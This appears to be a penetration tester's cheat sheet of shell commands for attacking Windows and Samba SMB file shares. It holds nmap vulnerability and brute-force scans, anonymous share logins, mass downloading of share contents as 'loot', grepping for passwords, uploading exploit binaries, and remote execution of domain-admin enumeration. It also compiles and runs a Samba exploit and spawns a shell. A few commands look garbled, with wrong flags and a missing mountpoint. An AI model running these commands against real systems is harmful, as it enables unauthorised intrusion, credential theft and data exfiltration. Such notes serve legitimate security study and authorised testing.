
#### Quick Wins (require creds)

[[zz._Gaining Shell Access (psexec.py)]]
[[zz._Gaining Shell Access (smbexec.py)]]
[[zz._Gaining Shell Access (wmiexec.py)]]

#### nmap vuln check:
```bash - kali
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $TARGET -Pn
```

#### SMB Mounting
```bash - kali
sudo apt install cifs-utils
```

```bash - kali
mkdir ./$SHARE
```

```bash - kali
sudo mount -t nfs $TARGET:/$SHARE/
```

```bash - kali
sudo mount -t cifs //$TARGET/$SHARE ./$SHARE -o user=,password=
```
OR
```bash - kali
sudo mount -t cifs //$TARGET/$SHARE ./$SHARE -o username=$USER,password=$PASSWORD,domain=$DOMAIN
```

```bash - kali
grep -R password ./$SHARE
```

[[Grep]] for lootz.

```bash - kali
sudo umount ./mount
```

#### SMB Enumeration

==CHECK TO SEE IF YOU CAN UPLOAD FILES!==

Enum4linux-ng:
```bash - kali
cd /opt/ && sudo git clone https://github.com/cddmp/enum4linux-ng && cd -
```

```bash - kali
/opt/enum4linux-ng/enum4linux-ng.py $TARGET -A -C
```

nmap scans:
```bash - kali
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $TARGET
```

```bash - kali
nmap --script smb-brute.nse -p445 $TARGET
```

smbmap:
```bash - kali
smbmap -H $TARGET -P 445
```

```bash - kali
smbmap -u null -p "" -H $TARGET -P 445
```

[[Port 139 445 - SMB ~#smbmap.py]]

List share and gain access with smbclient:
```bash - kali
smbclient -L \\\\$TARGET\\ -N -p 445
```

```bash - kali
smbclient -N //$TARGET/$SHARE
```

smbclient anonymous login:
```bash - kali
smbclient -L $TARGET -U " "%" "
```

```bash - kali
smbclient \\\\$TARGET\\scripts$ -U " "%" "
```

[[Port 139 445 - SMB ~#smbclient]]
#### smbmap.py
```bash - kali
smbmap -H $TARGET
```

```bash - kali
smbmap -H $TARGET -r 'home'
```

```bash - kali
smbmap -H $TARGET -r 'home\$USER'
```

### smbmap Downloading files:
```bash - kali
smbmap -H $TARGET --download 'home\$USER\file.txt'
```

#### smbmap Uploading files:
```bash - kali
smbmap -H $TARGET --upload exploit.exe 'home\$USER\'
```

```bash - kali
smbmap -H $TARGET -P 445 --upload exploit.so 'Share/exploit.so' 
```

```bash - kali
smbmap -u $USER -p $PASSWORD -d $DOMAIN_NAME -x 'net group "Domain Admins" /domain' -H $TARGET
```

#### smbclient

```bash - kali
smbclient -L \\\\$TARGET -N -p 445
```

Using smbclient without creds:
```bash - kali
smbclient \\\\$TARGET\\share -p 445
```

Using smbclient to list shares (authenticated):
```bash - kali
smbclient -L \\\\$TARGET -U "$USER" -p $PASSWORD
```

Using smbclient with creds:
```bash - kali
smbclient \\\\$TARGET\\spray -U "$USER" -p $PASSWORD
```

#### using smbclient to download all files:

```bash - kali
mkdir SMBLoot && cd SMBLoot
```

Unauthenticated:
```bash - kali
smbclient '\\\\$TARGET\\$SHARE'
```

```bash - kali
smbclient -N //$TARGET/$SHARE
```

Authenticated:
```bash - kali
smbclient --user $USER //$TARGET/$SHARE $PASSWORD
```

```bash - kali
mask ""  
```

```bash - kali
recurse ON  
```

```bash - kali
prompt OFF  
```

```bash - kali
mget *
```

```bash - kali
exit
```

```bash - kali
cd ..
```

```bash - kali
find SMBLoot/ -type f
```


==2nd example==
```bash - kali
smbclient //$TARGET/$SHARE
```

```bash - kali
RECURSE ON
```

```bash - kali
PROMPT OFF
```

```bash - kali
mget *
```

#### Low Level Samba Exploit
```bash - kali
searchsploit -m 10
```

```bash - kali
gcc -o exploit-samba 10.c
```

```bash - kali
./exploit-samba -b 0 $TARGET
```

```bash - kali
python -c 'import pty;pty.spawn("/bin/bash")'
```

#### Windows share local folder with everyone

```command prompt - target
net share cshare C:\$SHARE /GRANT:Everyone,FULL
```
  
#### Unsafe nmap script
```bash kali
sudo nmap --script=smb-enum* --script-args=unsafe=1 $TARGET
```

#### Responder - File upload attack
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/